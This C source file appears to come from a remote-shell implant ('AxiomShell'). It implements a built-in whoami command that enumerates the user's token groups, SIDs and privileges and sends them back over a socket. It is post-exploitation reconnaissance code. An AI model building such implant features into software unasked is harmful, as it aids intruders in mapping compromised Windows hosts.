#include "AxiomShell.h"
#include "Glibc.h"
#include "Utils.h"
#include <sddl.h>

static void get_priv(SOCKET sock)
{
	HANDLE currentToken;
	NTSTATUS status;
	LPVOID infoBuffer;
	DWORD infoBufferSize, tmpBufferSize;
	DWORD winError;
	char buffer[1024];
	const char* descriptions[][2] = {
		{ "SeIncreaseQuotaPrivilege", "Adjust memory quotas for a process" },
		{ "SeSecurityPrivilege", "Manage auditing and security log" },
		{ "SeTakeOwnershipPrivilege", "Take ownership of files or other objects" },
		{ "SeLoadDriverPrivilege", "Load and unload device drivers" },
		{ "SeSystemProfilePrivilege", "Profile system performance" },
		{ "SeSystemtimePrivilege", "Change the system time" },
		{ "SeProfileSingleProcessPrivilege", "Profile single process" },
		{ "SeIncreaseBasePriorityPrivilege", "Increase scheduling priority" },
		{ "SeCreatePagefilePrivilege", "Create a pagefile" },
		{ "SeBackupPrivilege", "Back up files and directories" },
		{ "SeRestorePrivilege", "Restore files and directories" },
		{ "SeShutdownPrivilege", "Shut down the system" },
		{ "SeDebugPrivilege", "Debug programs" },
		{ "SeSystemEnvironmentPrivilege", "Modify firmware environment values" },
		{ "SeChangeNotifyPrivilege", "Bypass traverse checking" },
		{ "SeRemoteShutdownPrivilege", "Force shutdown from a remote system" },
		{ "SeUndockPrivilege", "Remove computer from docking station" },
		{ "SeManageVolumePrivilege", "Perform volume maintenance tasks" },
		{ "SeImpersonatePrivilege", "Impersonate a client after authentication" },
		{ "SeCreateGlobalPrivilege", "Create global objects" },
		{ "SeIncreaseWorkingSetPrivilege", "Increase a process working set" },
		{ "SeTimeZonePrivilege", "Change the time zone" },
		{ "SeCreateSymbolicLinkPrivilege", "Create symbolic links" },
		{ "SeDelegateSessionUserImpersonatePrivilege", "Obtain an impersonation token for another user in the same session" },
		{ NULL, NULL }
	};

	infoBuffer = NULL;
	infoBufferSize = 0;
	tmpBufferSize = 0;
	status = OpenThreadToken(GetCurrentThread(), TOKEN_READ, TRUE, &currentToken);
	if (!status)
	{
		status = OpenProcessToken(GetCurrentProcess(), TOKEN_READ, &currentToken);
		if (!status)
		{
			JSON_send_packets(JsonCommandOutput, sock, (void*)"[!] Opening process failed !\n");
			return;
		}
	}

setupInfo:
	status = GetTokenInformation(currentToken, TokenPrivileges, infoBuffer, infoBufferSize, &tmpBufferSize);
	winError = GetLastError();
	if (status == 0 && winError == ERROR_INSUFFICIENT_BUFFER)
	{
		if (infoBuffer != NULL)
			LocalFree(infoBuffer);
		infoBuffer = LocalAlloc(LMEM_FIXED, tmpBufferSize);
		infoBufferSize = tmpBufferSize;
		goto setupInfo;
	}

	JSON_send_packets(JsonCommandOutput, sock, (void*)"PRIVILEGES INFORMATION\n-----------------------\n\n");
	JSON_send_packets(JsonCommandOutput, sock, (void*)"Privilege Name                            Description                                                        State   \n");
	JSON_send_packets(JsonCommandOutput, sock, (void*)"========================================= ================================================================== ========\n");
	for (DWORD i = 0; i < ((PTOKEN_PRIVILEGES)infoBuffer)->PrivilegeCount; i++)
	{
		char privbuffer[256];
		LUID_AND_ATTRIBUTES luidattrs;
		DWORD buffersize = sizeof(buffer);
		const char* attributeToStateDispatcher[] = {
			"Disabled",
			"?? (1)",
			"Manually Enabled",
			"Enabled"
		};

		luidattrs = ((PTOKEN_PRIVILEGES)infoBuffer)->Privileges[i];
		if (LookupPrivilegeNameA(NULL, &luidattrs.Luid, (LPSTR)privbuffer, &buffersize))
		{
			int i = 0;
			char* description = NULL;
			while (descriptions[i][0] != NULL)
			{
				if (drunk_strcmp(descriptions[i][0], privbuffer) == 0)
				{
					description = (char*)descriptions[i][1];
					break;
				}
				i++;
			}
			snprintf(buffer, sizeof(buffer), "%-41s %-66s %s\n", privbuffer, description, attributeToStateDispatcher[luidattrs.Attributes]);
			JSON_send_packets(JsonCommandOutput, sock, (void*)buffer);
		}
	}
	JSON_send_packets(JsonCommandOutput, sock, (void*)"\n");
}

static void get_groups(SOCKET sock)
{
	DWORD infoLength;
	PTOKEN_GROUPS tokenGroups;
	GetTokenInformation(
		GetCurrentProcessToken(),
		TokenGroups,
		NULL,
		0,
		&infoLength
	);

	tokenGroups = (PTOKEN_GROUPS)malloc(infoLength);
	GetTokenInformation(
		GetCurrentProcessToken(),
		TokenGroups,
		tokenGroups,
		infoLength,
		&infoLength
	);

	JSON_send_packets(JsonCommandOutput, sock, (void*)"GROUP INFORMATIONS\n------------------\n\n");
	JSON_send_packets(JsonCommandOutput, sock, (void*)"Group Name                                                    SID\n");
	JSON_send_packets(JsonCommandOutput, sock, (void*)"============================================================= ===========================================\n");
	for (DWORD i = 0; i < tokenGroups->GroupCount; i++)
	{
		LPSTR strSid;
		ConvertSidToStringSidA(tokenGroups->Groups[i].Sid, &strSid);

		char sendBuffer[1024];
		char username[256];
		char domainName[256];
		char *fullname;
		DWORD usernameSize = 256;
		DWORD domainNameSize = 256;
		SID_NAME_USE sidUse;
		LookupAccountSidA(
			NULL,
			tokenGroups->Groups[i].Sid,
			username,
			&usernameSize,
			domainName,
			&domainNameSize,
			&sidUse
		);

		fullname = (char*)malloc(strlen(username) + strlen(domainName) + strlen("\\") + 1);
		memset(fullname, 0, strlen(username) + strlen(domainName) + strlen("\\") + 1);
		if (strlen(domainName) > 0)
		{
			drunk_strcpy(fullname, domainName);
			drunk_strcat(fullname, "\\");
		}
		drunk_strcat(fullname, username);

		snprintf(sendBuffer, sizeof(sendBuffer), "%-61s %s\n", fullname, strSid);
		JSON_send_packets(JsonCommandOutput, sock, (void*)sendBuffer);

		LocalFree(strSid);
		free(fullname);
	}

	free(tokenGroups);
	JSON_send_packets(JsonCommandOutput, sock, (void*)"\n");
}

BOOL BUILTIN_whoami(SOCKET sock, size_t argc, char **argv)
{
	char buffer[2048];
	size_t i;
	BOOL enum_group = FALSE, enum_priv = FALSE, enum_all = FALSE;

	i = 0;
	memset(buffer, 0, sizeof(buffer));
	while (i < argc)
	{
		if (drunk_strcmp(argv[i], "/groups") == 0)
		{
			enum_group = TRUE;
			//send_command_output(sock, "[*] Running in enum-group mode\n", 32);
		}
		else if (drunk_strcmp(argv[i], "/priv") == 0)
		{
			enum_priv = TRUE;
			//send_command_output(sock, "[*] Running in enum-priv mode\n", 31);
		}
		else if (drunk_strcmp(argv[i], "/all") == 0)
		{
			enum_all = TRUE;
			//send_command_output(sock, "[*] Running in enum-all mode\n", 30);
		}
		else {
			snprintf(buffer, sizeof(buffer), "[!] Unknown option: %s\n", argv[i]);
			JSON_send_packets(JsonCommandOutput, sock, (void*)buffer);
			return (FALSE);
		}
		i++;
	}

	char* domain;
	char* username;
	char* userSid;
	if (!UTILS_get_impersonated_user_and_sid(&domain, &username, &userSid))
		return (FALSE);

	if (enum_group || enum_priv || enum_all)
	{
		snprintf(buffer, sizeof(buffer), "%s\\%s (%s)\n\n", domain, username, userSid);
		JSON_send_packets(JsonCommandOutput, sock, (void*)buffer);
	}
	else
	{
		snprintf(buffer, sizeof(buffer), "%s\\%s\n\n", domain, username);
		JSON_send_packets(JsonCommandOutput, sock, (void*)buffer);
	}

	if (enum_group || enum_all) { get_groups(sock); }
	if (enum_priv || enum_all) { get_priv(sock); }

	free(domain);
	free(username);
	free(userSid);
	return (TRUE);
}

